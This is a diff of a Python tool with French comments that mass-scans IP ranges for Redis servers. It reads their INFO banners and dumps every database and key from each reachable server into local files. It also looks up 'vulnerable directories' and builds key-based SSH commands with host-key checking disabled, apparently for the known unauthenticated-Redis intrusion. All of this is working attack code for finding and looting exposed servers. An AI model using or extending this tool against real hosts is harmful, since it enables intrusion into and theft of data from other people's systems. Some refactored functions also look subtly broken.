@@ -170,33 +170,151 @@ class RedisUtility:
         logging.debug("List des modules : Aucun module trouvé")
         return False, "Aucun module trouvé"
 
+    def redis_get_banner(self) -> Tuple[bool, str]:
+        success, data = self.execute_command_redis(["INFO"])
+        if not success:
+            return False, data
+
+        if data:
+            redis_version = re.search(r"redis_version:(.*?)\n", data)
+            if redis_version:
+                redis_version = redis_version.group(1)
+            else:
+                redis_version = None
+
+            redis_os = re.search(r"os:(.*?)\n", data)
+            if redis_os:
+                redis_os = redis_os.group(1)
+            else:
+                redis_os = None
+
+            redis_role = re.search(r"role:(.*?)\n", data)
+            if redis_role:
+                redis_role = redis_role.group(1)
+            else:
+                redis_role = None
+
+            uptime_in_seconds = int(re.search(r"uptime_in_seconds:(\d+)\n", data).group(1))
+            # Créez un objet timedelta à partir du nombre d'uptime en secondes
+            uptime_timedelta = datetime.timedelta(seconds=uptime_in_seconds)
+
+            # Convertissez la durée en une chaîne lisible
+            uptime_str = str(uptime_timedelta)
+
+            used_memory = int(re.search(r"used_memory:(\d+)\n", data).group(1))
+            total_connections_received = int(
+                re.search(r"total_connections_received:(\d+)\n", data).group(1)
+            )
+            total_commands_processed = int(
+                re.search(r"total_commands_processed:(\d+)\n", data).group(1)
+            )
+
+            # Afficher les valeurs extraites
+            if redis_version:
+                logfile(f"Redis Version: {redis_version}", self.args)
+            if redis_os:
+                logfile(f"Redis Operating System: {redis_os}", self.args)
+
+            if redis_role:
+                logfile(f"Redis Role: {redis_role}", self.args)
+
+                # Affichez la durée
+                logfile(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})", self.args)
+                logfile(f"Used Memory: {used_memory} bytes", self.args)
+                logfile(f"Total Connections Received: {total_connections_received}", self.args)
+                logfile(f"Total Commands Processed: {total_commands_processed}", self.args)
+                return True, "OK"
+
+            else:
+                return False, data
+
     def redis_get_dump(self) -> Tuple[bool, str]:
+        """Extrait les données de Redis et les enregistre dans des fichiers de dump.
+
+        Returns:
+            Tuple[bool, str]: Indique le succès de l'opération et un message.
+        """
+        try:
+            self._create_dump_directory()
+            redis_conn = self._create_redis_connection()
+
+            for db_number in self._get_databases(redis_conn):
+                self._export_database(redis_conn, db_number)
+                self._export_keys(redis_conn, db_number)
+
+            redis_conn.close()
+            return True, "OK"
+        except Exception as e:
+            logging.error(f"Erreur lors de l'extraction Redis: {e}")
+            return False, f"Erreur: {e}"
+
+    def _create_dump_directory(self):
+        """Crée un répertoire de dumps si nécessaire."""
         if not os.path.isdir("dumps"):
             os.mkdir("dumps")
-            logging.info("Created 'dumps' directory in the current directory.")
-        redis_conn = redis.StrictRedis(self.ip_address, self.port, db=0)
-        dbs = redis_conn.info('keyspace').keys()
-        for db in dbs:
-            db_number = int(db[2:])
-            print(db_number)
-            rdb_filename = f'db_{self.ip_address}_{db_number}.rdb'
-            redis_conn.select(db_number)
-            redis_conn.bgsave(rdb_filename)
-            while redis_conn.info("persistence")["rdb_bgsave_in_progress"]:
-                time.sleep(1)
-            logging.info(f"Database {db_number} exported to {rdb_filename}")
+            logging.info("Répertoire 'dumps' créé.")
 
-            keys = redis_conn.keys("*")
-            dump_path = os.path.join("dumps", f"{self.ip_address}")
-            os.makedirs(dump_path, exist_ok=True)
-            for key in keys:
-                key_data = self.redis_get_dump_parser(redis_conn.get(key).decode("utf-8"))
-                self.redis_get_dump_parser_url(key_data, dump_path)
-                FileHandler.write_lines(os.path.join(dump_path, f"{key}.dump"), [key_data])
-                logging.info(f"Key {key} exported")
+    def _create_redis_connection(self):
+        """Établit une connexion Redis.
 
-        redis_conn.close()
-        return True, "OK"
+        Returns:
+            Redis: Connexion Redis.
+        """
+        return redis.StrictRedis(self.ip_address, self.port, db=0)
+
+    def _get_databases(self, redis_conn) -> list:
+        """Récupère les numéros des bases de données Redis.
+
+        Args:
+            redis_conn (Redis): Connexion Redis.
+
+        Returns:
+            list: Liste des numéros de bases de données.
+        """
+        dbs_info = redis_conn.info("keyspace")
+        return [int(db[2:]) for db in dbs_info.keys()]
+
+    def _export_database(self, redis_conn, db_number: int):
+        """Exporte une base de données Redis.
+
+        Args:
+            redis_conn (Redis): Connexion Redis.
+            db_number (int): Numéro de la base de données.
+        """
+        rdb_filename = f"db_{self.ip_address}_{db_number}.rdb"
+        redis_conn.select(db_number)
+        redis_conn.bgsave(rdb_filename)
+        while redis_conn.info("persistence")["rdb_bgsave_in_progress"]:
+            time.sleep(1)
+        logging.info(f"Base de données {db_number} exportée vers {rdb_filename}")
+
+    def _export_keys(self, redis_conn, db_number: int):
+        """Exporte les clés d'une base de données Redis.
+
+        Args:
+            redis_conn (Redis): Connexion Redis.
+            db_number (int): Numéro de la base de données.
+        """
+        keys = redis_conn.keys("*")
+        dump_path = os.path.join("dumps", f"{self.ip_address}")
+        os.makedirs(dump_path, exist_ok=True)
+
+        for key in keys:
+            key_data = self._get_key_data(redis_conn, key)
+            FileHandler.write_lines(os.path.join(dump_path, f"{key}.dump"), [key_data])
+            logging.info(f"Clé {key} exportée")
+
+    def _get_key_data(self, redis_conn, key) -> str:
+        """Récupère les données d'une clé Redis.
+
+        Args:
+            redis_conn (Redis): Connexion Redis.
+            key (str): Clé Redis.
+
+        Returns:
+            str: Données de la clé.
+        """
+        return redis_conn.get(key).decode("utf-8")
 
     def execute_command_redis(self, redis_command: List[str]) -> Tuple[bool, str]:
         logging.debug("Redis execute_command: %s", redis_command)
@@ -314,7 +432,7 @@ class RedisServerManager:
             self.args.timeout,
             self.args.threads
         )
-        success, msg = self.redis_get_banner()
+        success, msg = self.redis_utility.redis_get_banner()
 
         if not success:
             return False, msg
@@ -338,42 +456,6 @@ class RedisServerManager:
         return True, "Finished"
 
     # Dans la méthode redis_get_banner, mettez à jour l'appel à logfile pour inclure args.outfile
-    def redis_get_banner(self) -> Tuple[bool, str]:
-        success, data = self.redis_utility.execute_command_redis(["INFO"])
-        if not success:
-            return False, data
-
-        redis_version = re.search(r"redis_version:(.*?)\n", data).group(1)
-        redis_os = re.search(r"os:(.*?)\n", data).group(1)
-        redis_role = re.search(r"role:(.*?)\n", data).group(1)
-
-        uptime_in_seconds = int(re.search(r"uptime_in_seconds:(\d+)\n", data).group(1))
-        # Créez un objet timedelta à partir du nombre d'uptime en secondes
-        uptime_timedelta = datetime.timedelta(seconds=uptime_in_seconds)
-
-        # Convertissez la durée en une chaîne lisible
-        uptime_str = str(uptime_timedelta)
-
-        used_memory = int(re.search(r"used_memory:(\d+)\n", data).group(1))
-        total_connections_received = int(
-            re.search(r"total_connections_received:(\d+)\n", data).group(1)
-        )
-        total_commands_processed = int(
-            re.search(r"total_commands_processed:(\d+)\n", data).group(1)
-        )
-
-        # Afficher les valeurs extraites
-        logfile(f"Redis Version: {redis_version}", self.args)
-        logfile(f"Redis Operating System: {redis_os}", self.args)
-
-        logfile(f"Redis Role: {redis_role}", self.args)
-
-        # Affichez la durée
-        logfile(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})", self.args)
-        logfile(f"Used Memory: {used_memory} bytes", self.args)
-        logfile(f"Total Connections Received: {total_connections_received}", self.args)
-        logfile(f"Total Commands Processed: {total_commands_processed}", self.args)
-        return True, "OK"
 
     def find_vulnerable_directory(self) -> Tuple[bool, str]:
         for directory in RedisConfig.VULNERABLE_DIRECTORIES:
@@ -405,7 +487,7 @@ class RedisServerManager:
                 stderr=subprocess.PIPE,
                 universal_newlines=True,
             )
-            stdout, stderr = process.communicate(timeout=float(self.timeout))
+            stdout, stderr = process.communicate(timeout=float(self.args.timeout))
             if process.returncode == 0:
                 return True, stdout.strip(), stderr.strip()
             else:
@@ -413,19 +495,11 @@ class RedisServerManager:
         except subprocess.TimeoutExpired as timeout_error:
             return (
                 False,
-                "Le délai de la commande a expiré après %s secondes." % self.timeout,
+                "Le délai de la commande a expiré après %s secondes." % self.args.timeout,
                 str(timeout_error),
             )
         except OSError as os_error:
             return False, "Erreur : %s" % str(os_error), str(os_error)
-
-    def _check_redis_result(
-        self, result: subprocess.CompletedProcess
-    ) -> Tuple[bool, str]:
-        if result.returncode != 0:
-            return False, result.stderr.strip()
-        return True, "Commande exécutée avec succès."
-    # @staticmethod
 
 
 def logfile(message: str, args):
@@ -448,46 +522,50 @@ def execute_ssh_command(self) -> Tuple[bool, str]:
         logging.info("Erreur : %s", stderr_output)
         return False, stderr_output
 
-    def build_ssh_command(self) -> List[str]:
-        return [
-            "ssh",
-            "-o",
-            "StrictHostKeyChecking=no",
-            "-o",
-            "ConnectTimeout=%s" % self.timeout,
-            "-o",
-            "PasswordAuthentication=no",
-            "-i",
-            self.ssh_key,
-            "%s@%s" % (self.user, self.ip_address),
-        ]
+
+def build_ssh_command(self) -> List[str]:
+    return [
+        "ssh",
+        "-o",
+        "StrictHostKeyChecking=no",
+        "-o",
+        "ConnectTimeout=%s" % self.timeout,
+        "-o",
+        "PasswordAuthentication=no",
+        "-i",
+        self.ssh_key,
+        "%s@%s" % (self.user, self.ip_address),
+    ]
 
 
 def process_ip(ip_address, args):
     ip_address = ip_address.strip()
     if ip_address:
         args.ip_address = ip_address
-        logging.debug(f"Traitement de l'adresse IP : {ip_address}")
+        logging.debug("Traitement de l'adresse IP : %s", ip_address)
         manager = RedisServerManager(args)
         success, message = manager.process_server()
-        logfile(message, args)
+        return success, message
+    return False, "Aucune adresse IP spécifiée"
 
 
 def process_file(args):
     file_path = args.file
-    print("-------------------------------")
-    logging.debug(f"Traitement du fichier : {file_path}")
-    # Fonction pour traiter une adresse IP
+    logging.debug("Traitement du fichier : %s", file_path)
     with open(file_path, "r", encoding="utf-8") as file:
         ip_addresses = [line.strip() for line in file if line.strip()]
 
-    # Utilisez ThreadPoolExecutor pour exécuter le traitement en parallèle
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        executor.map(process_ip, ip_addresses, [args] * len(ip_addresses))
+        results = executor.map(process_ip, ip_addresses, [args] * len(ip_addresses))
+
+    for result in results:
+        success, message = result
+        if success:
+            logfile(message, args)
+    return True, "OK"
 
 
 def process_scan(args, ip_range):
-
     start_ip, end_ip = ip_range
     args.ip_address = start_ip + "-" + end_ip
     logfile("Scan de la plage", args)
@@ -495,29 +573,40 @@ def process_scan(args, ip_range):
     end_ip = ipaddress.ip_address(end_ip)
 
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        while start_ip <= end_ip:
-            args.ip_address = str(start_ip)
+        while int(start_ip) <= int(end_ip):
+            args.ip_address = str(ipaddress.IPv4Address(start_ip))
             executor.submit(scan_port, args)
-            start_ip += 1
+            start_ip = int(start_ip) + 1
+    return True, "OK"
+
+
+def process_scanfile(args, ip_range):
+    with open(args.scanfile, "r", encoding="utf-8") as file:
+        for line in file:
+            ip_range = line.strip().split()
+            if len(ip_range) == 2:
+                success, message = process_scan(args, ip_range)
+    return success, message
 
 
 def scan_port(args):
-    logging.debug(f"Tentative de connexion à {args.ip_address}:{args.port}")
+    logging.debug("Tentative de connexion à %s:%s", args.ip_address, args.port)
+    print("Tentative de connexion à %s:%s" % (args.ip_address, args.port))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(args.timeout)  # Utilisez args.timeout
+    sock.settimeout(args.timeout)
     try:
         sock.connect((args.ip_address, args.port))
-        logging.debug(f"Port {args.port} ouvert sur {args.ip_address}")
-        manager = RedisServerManager(args)  # Utilisez args directement
+        logging.debug("Port %s ouvert sur %s", args.port, args.ip_address)
+        manager = RedisServerManager(args)
         success, message = manager.process_server()
         if not success:
-            logging.warning(f"Error processing server {args.ip_address} : {message}")
+            logging.warning("Error processing server %s : %s", args.ip_address, message)
             return
-        logfile(
-            message, args
-        )
+        logfile(message, args)
     except socket.error as e:
-        logging.debug(f"Port {args.port} fermé sur {args.ip_address} ou erreur : {e}")
+        logging.debug(
+            "Port %s fermé sur %s ou erreur : %s", args.port, args.ip_address, e
+        )
     finally:
         sock.close()
 
@@ -545,45 +634,38 @@ def parse_arguments() -> argparse.Namespace:
     return args
 
 
+def help_main():
+    logging.warning(
+        "Aucune adresse IP ou chemin de fichier spécifié. "
+        "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
+        "'-f' pour spécifier un fichier contenant des adresses IP. "
+        "'-sc' pour scanner les adresses IP. "
+        "Utilisez '--help' pour plus d'informations."
+    )
+
+
 def main():
     args = parse_arguments()
     configure_logging(args.verbose)
     logging.debug("Arguments de la ligne de commande : %s", args)
-    if not (args.ip or args.file or args.scan or args.scanfile):
-        logging.warning(
-            "Aucune adresse IP ou chemin de fichier spécifié. "
-            "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
-            "'-f' pour spécifier un fichier contenant des adresses IP. "
-            "'-sc' pour scanner les adresses IP. "
-            "Utilisez '--help' pour plus d'informations."
-        )
-    elif args.scanfile:
-        with open(args.scanfile, "r", encoding="utf-8") as file:
-            for line in file:
-                ip_range = line.strip().split()
-                if len(ip_range) == 2:
-                    process_scan(args, ip_range)
-
-    elif args.ip:
+    if args.ip:
         args.ip_address = args.ip
-        manager = RedisServerManager(
-            args
-        )
+        manager = RedisServerManager(args)
         success, message = manager.process_server()
-
-        logfile(message, args)
-
     elif args.scan:
         logging.debug("Début du scan de la plage IP %s", args.scan)
-        process_scan(args, args.scan)
+        success, message = process_scan(args, args.scan)
+    elif args.scanfile:
+        success, message = process_scanfile(args, args.scanfile)
     elif args.file:
-        process_file(args)
+        success, message = process_file(args)
     else:
-        logging.warning("Aucune adresse IP ou chemin de fichier spécifié. "
-                        "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
-                        "'-f' pour spécifier un fichier contenant des adresses IP. "
-                        "'-sc' pour scanner les adresses IP. "
-                        "Utilisez '--help' pour plus d'informations.")
+        success = False
+        message = None
+        help_main()
+
+    if success:
+        logfile(message, args)
 
 
 if __name__ == "__main__":
